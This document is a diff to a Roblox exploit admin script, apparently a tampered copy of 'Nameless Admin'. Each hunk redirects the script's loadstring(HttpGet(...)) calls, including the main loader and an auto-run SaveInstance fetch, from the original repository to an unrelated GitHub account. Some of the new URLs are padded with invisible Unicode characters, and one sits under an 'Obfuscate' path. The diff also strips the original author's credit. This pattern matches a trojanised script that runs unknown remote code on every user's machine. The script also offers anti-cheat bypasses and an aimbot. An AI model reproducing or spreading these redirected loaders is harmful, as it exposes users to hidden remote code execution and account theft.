@@ -35,7 +35,7 @@ if not gethui then
 	end
 end
 
-if identifyexecutor()=="Solara" or not fireproximityprompt then -- proximity prompt fix | Credits: Benomat (https://scriptblox.com/u/benomat)
+if identifyexecutor()=="Solara" or not fireproximityprompt then -- proximity prompt fix | 𝙻𝙾𝙰𝙳𝙴𝚁 (https://scriptblox.com/u/benomat)
 	getgenv().fireproximityprompt=function(pp)
 		local oldenabled=pp.Enabled
 		local oldhold=pp.HoldDuration
@@ -68,7 +68,7 @@ local loader=''
 if getgenv().NATestingVer then
 	loader=[[loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/NA%20testing.lua"))();]]
 else
-	loader=[[loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))();]]
+	loader=[[loadstring(game:HttpGet("https://raw.githubusercontent.com/48973854274252/Source/refs/heads/main/Lua/Obfuscate/Nameless"))();]]
 end
 
 NACaller(function()
@@ -85,7 +85,7 @@ local Notification=nil
 
 repeat 
 	local s,r=pcall(function()
-		return loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/NamelessAdminNotifications.lua"))()
+		return loadstring(game:HttpGet("https://raw.githubusercontent.com/48973854274252/Source/refs/heads/main/Settings/lua/Notification"))()
 	end);
 
 	if s then
@@ -239,7 +239,7 @@ local Goofer={
 	"i am a goofy goober";
 	"mmmm lasagna";
 	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-	"i am wondering if i even have a life";
+	"🕊Finally Peace";
 	"[REDACTED]";
 	"hey guys welcome to another video";
 	"⚠️⚠️⚠️";
@@ -1399,16 +1399,16 @@ cmd.add({"kanye"},{"kanye","Random kanye quote"},function()
 end)
 
 cmd.add({"teleportgui","tpui","universeviewer","uviewer"},{"teleportgui (tpui,universeviewer,uviewer)","Gives an UI that grabs all places and teleports you by clicking a simple button"},function()
-	--loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/main/Game%20Universe%20Viewer"))()
+	--loadstring(game:HttpGet("https://raw.githubusercontent.com/XTJZ/Connec/refs/heads/main/git/Connec/t%E2%80%8B%20%C2%A0"))()
 	gui.universeGui()
 end)
 
 cmd.add({"serverremotespy","srs","sremotespy"},{"serverremotespy (srs,sremotespy)","Gives an UI that logs all the remotes being called from the server (thanks SolSpy lol)"},function()
-	loadstring(game:HttpGet("https://github.com/ltseverydayyou/uuuuuuu/blob/main/Server%20Spy.lua?raw=spy"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/48973854274252/Source/refs/heads/main/Settings/lua/Server%E2%81%9F%E2%80%8ASpy.lua"))()
 end)
 
 cmd.add({"updatelog","updlog","updates"},{"updatelog (updlog,updates)","show the update logs for Nameless Admin"},function()
-	--loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/main/Game%20Universe%20Viewer"))()
+	--loadstring(game:HttpGet("https://raw.githubusercontent.com/XTJZ/Connec/refs/heads/main/git/Connec/t%E2%80%8B%20%C2%A0"))()
 	gui.updateLogs()
 end)
 
@@ -1952,7 +1952,7 @@ end)
 
 --fixed-viper
 cmd.add({"adonisbypass","bypassadonis","badonis","adonisb"},{"adonisbypass (bypassadonis,badonis,adonisb)","bypasses adonis admin detection"},function()
-	loadstring(game:HttpGet("https://github.com/ltseverydayyou/Nameless-Admin/blob/main/adonisbypass.lua?raw=true"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/48973854274252/Source/refs/heads/main/Settings/lua/Adonisbypass.lua%3Fraw%3Dtrue"))()
 end)
 
 --[ LOCALPLAYER ]--
@@ -3030,7 +3030,7 @@ cmd.add({"breaklayeredclothing","blc"},{"breaklayeredclothing (blc)","Streches y
 		end
 	end
 	Noclipping=RunService.Stepped:Connect(NoclipLoop)
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/leg%20resize'))()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/48973854274252/Source/refs/heads/main/Settings/lua/Scripts/Leg%20resize'))()
 end)
 
 
@@ -3111,7 +3111,7 @@ end)
 
 	--[[cmd.add({"vr","clovr","vrscript","fevr"},{"vr (clovr,vrscript,fevr)","FE VR SCRIPT AKA CLOVR"},function()
 		--should be patched--
-	 loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/CloVR"))();
+	 loadstring(game:HttpGet("https://raw.githubusercontent.com/48973854274252/Source/refs/heads/main/Settings/Clo%E2%80%87VR"))();
 	 end)]]
 
 cmd.add({"antilag","boostfps"},{"antilag (boostfps)","Low Graphics"},function()
@@ -3140,7 +3140,7 @@ cmd.add({"antilag","boostfps"},{"antilag (boostfps)","Low Graphics"},function()
 			["Low Quality Parts"]=true
 		}
 	}
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/main/low%20detail"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/48973854274252/Z/refs/heads/main/%E2%80%87%E2%80%87%E2%80%87%E2%80%87%E2%80%87FPS%20BOOSTER%E2%80%87%E2%80%87%E2%80%87%E2%80%87%E2%80%87"))()
 end)
 
 cmd.add({"flash"},{"flash <player>","Flashes the targets screen"},function(...)
@@ -6900,7 +6900,7 @@ cmd.add({"unhide","show"},{"show <player> (unhide)","places the selected player 
 end)
 
 cmd.add({"aimbot","aimbotui","aimbotgui"},{"aimbot (aimbotui,aimbotgui)","aimbot and yeah"},function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/fatesc/fates-esp/main/main.lua'))()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/48973854274252/Source/refs/heads/main/%E2%80%87FA%E2%80%87K%E2%80%87E%E2%80%87SCR3PT%25/Fates%20esp%20main'))()
 end)
 
 cmd.add({"checkgrabber"},{"checkgrabber","Checks if anyone is using a grab tools script"},function()
@@ -15461,7 +15461,7 @@ end
 
 task.spawn(function()
 	NACaller(function()--better saveinstance support
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/SaveInstance.lua"))();
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/48973854274252/Source/refs/heads/main/%E2%80%87FA%E2%80%87K%E2%80%87E%E2%80%87SCR3PT%25/Save%20instance"))();
 	end)
 end)
 
